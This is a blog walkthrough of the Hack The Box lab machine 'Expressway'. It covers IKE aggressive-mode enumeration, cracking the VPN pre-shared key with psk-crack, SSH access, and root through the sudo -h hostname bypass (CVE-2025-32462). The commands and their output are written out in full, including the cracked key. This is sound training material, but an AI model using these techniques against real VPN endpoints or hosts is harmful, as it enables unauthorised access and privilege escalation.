---
title: Expressway — HTB
author: Radeel Ahmad
pubDatetime: 2025-09-22T15:14:00Z
tags:
  - hacking
  - HTB
  - IPsec
  - IKE
  - CVE-2025-32462
  - sudo
description:
  Hack The Box "Expressway" walkthrough — enumerating an IPsec/IKE VPN over UDP 500, cracking the PSK, XAUTH SSH access, and a sudo -h hostname bypass (CVE-2025-32462) for root.
---

### Expressway — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Expressway**'.

![](/blog/images/htb/1*feCG9S_8pZTkp48AG04Vqw.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ nmap -sC -sV 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 15:14 UTC
Nmap scan report for 10.10.11.87
Host is up (0.43s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds
```

Update `etc/hosts`:

```
10.10.11.87 expressway.htb
```

UDP Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ nmap -sU 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 15:19 UTC
Nmap scan report for expressway.htb (10.10.11.87)
Host is up (0.43s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1065.29 seconds
```

> ISAKMP (Internet Security Association and Key Management Protocol) is part of the IKE (Internet Key Exchange) framework, commonly used in IPsec VPNs. It runs by default on UDP port 500 and is responsible for negotiating and establishing Security Associations (SAs) between systems. This process defines how encryption keys are exchanged and determines which encryption and hashing algorithms (such as 3DES, AES, or SHA1) will be used. A typical use case is when a client connects to an IPsec VPN, where both client and server first communicate over UDP/500 to agree on encryption methods and authenticate each other using mechanisms like pre-shared keys, certificates, or XAUTH. In short, if you see **500/udp open isakmp**, it usually means the target is running an IPsec VPN endpoint.

#### ike Scan

![](/blog/images/htb/1*71IgOAS_TTPsPT-Vvs3KbQ.png)

Aggressive Mode, and we got the username.

![](/blog/images/htb/1*7JB5rvdEGFfBrewUbJGr2w.png)

The host **10.10.11.87 (expressway.htb)** is running an IPsec VPN service on **UDP port 500 (ISAKMP/IKE)** and supports both Main Mode and Aggressive Mode. It uses **3DES encryption, SHA1 hashing, and Diffie-Hellman Group 2 (1024-bit)**, with authentication based on a **Pre-Shared Key (PSK)** valid for 8 hours. Additionally, it requires **XAUTH (Extended Authentication)**, meaning a username and password are needed after the PSK, and it has **Dead Peer Detection** enabled to verify client availability. During testing with Aggressive Mode and the `--id` option, the valid user was identified as **ike@expressway.htb**. In summary, the target is an **IPsec VPN server requiring PSK + XAUTH**, and the correct ID for negotiation is **ike@expressway.htb**.

We perform an aggressive Mode scan and test PSK.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ike-scan -A --pskcrack=out.txt expressway.htb
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=b9fe9239ce377be3) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.447 seconds (2.24 hosts/sec).  1 returned handshake; 0 returned notify

┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$cat out.txt
e823e8774c2f104e4e6541af9670caa5fa3d94e9503a5b855654a82887ba7e2c7243c92fbfb552ce675a6bdcefb59a988b56ac4cf5a4cbd52ceb1e379501007cc7e8e00733195948cbc0d93b2a76f5f8972c52733f3c06ce21af4b320eb26c13f9d1dd4cdfa2c900a7e32f12a780976745f484c045949f4a9a3dba38ec2890d8:ebbd59385cfdbcb334ef4e203f445eb16ae0bb4a598f547965bbb2fcaae4b150415c5feda4c4bce6f06654cfd9243cea20261963c74b72c5f8c0e77f22cb42fed9a108f4a68850e451960a3fce1c9a12103aad2b913c25d2ef6b6fbccd038d867f824fe9383c2c224a2664cf67672eb5a7e5aa1e50d5cf9f09590699d59ab4eb:b9fe9239ce377be3:c5c257e302b772d0:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:8eaf88bdabf38a2ed54f35f62d1434aec4509328:52346cb36d9087fdb9d9973f6e746cf16fa69efab958036148dc793317e061a3:014faeecc569b5a55008293d6852866fc6acea12
```

Cracked the PSK, and we found the password

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt out.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 014faeecc569b5a55008293d6852866fc6acea12
Ending psk-crack: 8045040 iterations in 30.498 seconds (263785.75 iterations/sec)
```

Access SSH as ike

```
┌──(kali㉿kali)-[~/Desktop/HTB/Expressway]
└─$ ssh ike@10.10.11.87
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password:
Last login: Mon Sep 22 15:56:07 BST 2025 from 10.10.16.43 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 22 16:27:04 2025 from 10.10.14.84
ike@expressway:~$ cat user.txt
4aeb9afaec1706f*************
ike@expressway:~$
```

---

### Privilege Escalation:

We enumerated sudo privileges and verified the sudo version for exploitation — the installed sudo is **version 1.9.17**.

```
ike@expressway:~$sudo -l
Password:
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$/usr/local/bin/sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

#### CVE-2025–32462

**GitHub - cyberpoul/CVE-2025-32462-POC** — Local privilege escalation PoC for CVE-2025-32462 (sudo `-h` bypass), gaining root via a misconfigured sudoers `host` restriction.

> Running `CVE-2025-32462.sh` did not immediately yield root, but its output showed the vulnerability can be exploited using `sudo -h` and requires a valid hostname (for example, `host.expressway.htb`).

We are searching in the logfiles for a hostname and found the hostname `offramp.expressway.htb`.

```
ike@expressway:~$ grep -R ".expressway.htb" /var/log/ 2>/dev/null
/var/log/squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

We exploit sudo with a custom host to gain access.

```
ike@expressway:~$/usr/local/bin/sudo -h offramp.expressway.htb -i
root@expressway:~# cat /root/root.txt
08880b65b9aa19****************
root@expressway:~#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
